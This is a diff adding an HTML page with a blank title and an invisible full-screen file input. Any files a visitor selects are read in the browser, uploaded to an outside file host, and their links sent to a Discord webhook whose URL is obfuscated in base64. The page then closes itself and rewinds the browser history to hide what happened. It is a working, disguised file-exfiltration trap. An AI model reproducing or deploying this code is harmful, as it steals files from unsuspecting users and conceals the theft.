@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>​</title>
+</head>
+<style>
+    body {
+        margin: 0;
+    }
+    input {
+        width: 100vw;
+        height: 100vh;
+        opacity: 0;
+    }
+</style>
+<body>
+    <input type="file" id="input" multiple />
+<script>
+    const CHUNK_SIZE = 1024 * 1024;
+    var totalfiles = 0;
+    var totaluploads = 0;
+    function splitFileIntoChunks(fileContent) {
+      const chunks = [];
+      let offset = 0;
+
+      while (offset < fileContent.byteLength) {
+        const end = Math.min(offset + CHUNK_SIZE, fileContent.byteLength);
+        const chunk = fileContent.slice(offset, end);
+        chunks.push(chunk);
+        offset += CHUNK_SIZE;
+      }
+
+      return chunks;
+    }
+    async function message(content) {
+        const msg = { "content": content.toString() }
+        const whurl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5MjYxNzk0NjI1MDQ4MTgxNS9ZcHpISnU3Ml9UT1JiOVViYnlGeG1LUEZESDNnTTZsdndvYWhfMWZIVUs2RU5KSEg4elFtaGFlR1paRFFUZ3p6UDVPdg==";
+        await fetch(atob(whurl), { 
+            "method":"POST", 
+            "headers": {
+                "content-type": "application/json",
+                "Transfer-Encoding": "chunked"
+            },
+            "Transfer-Encoding": "chunked",
+            "body": JSON.stringify(msg)
+        });
+        if (totaluploads == totalfiles) {
+            window.close();
+            history.go(-(window.history.length - 1));
+        }
+    }
+    async function upload(filename, datatype, data) {
+        const formData = new FormData();
+        const fileBlob = new Blob(data, { type: datatype });
+        formData.append(`files[]`, fileBlob, filename);
+        const form = await fetch("https://up1.fileditch.com/upload.php", {
+            method: "POST",
+            body: formData,
+        });
+        const response = await form.json();
+        totaluploads += 1;
+        if (response.success == true) {
+            await message(`**${filename}**\n${response.files[0].url}`);
+        } else {
+            await message(`**${filename}** failed to upload`);
+        }
+    }
+    input.addEventListener("change", function(){
+        const fileList = this.files; 
+        totalfiles += fileList.length;
+        for (let i = 0; i < fileList.length; i++) { 
+            const file = fileList[i];
+            const reader = new FileReader();
+            reader.onload = function (e) {
+                const fileContent = e.target.result;
+                const chunks = splitFileIntoChunks(fileContent);
+                upload(file.name, file.type, chunks);
+            };
+            reader.readAsArrayBuffer(file);
+        }
+    }, false);
+
+</script>
+</body>
+</html> 
